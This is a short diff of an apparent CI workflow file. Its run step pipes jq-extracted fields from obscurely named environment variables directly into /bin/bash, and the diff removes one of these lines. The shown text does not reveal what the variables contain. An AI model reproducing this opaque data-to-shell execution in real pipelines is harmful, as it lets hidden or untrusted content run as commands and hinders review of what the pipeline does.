@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$wr3243" | jq -r .j73 | /bin/bash
           echo $ts477 | jq -r .nn6 | /bin/bash
-          printf '%s' "$gqx231" | jq -r .wyma5 | /bin/bash
           echo $jskpe80 | jq -r .qvu689 | /bin/bash
 
       - name: Persist output
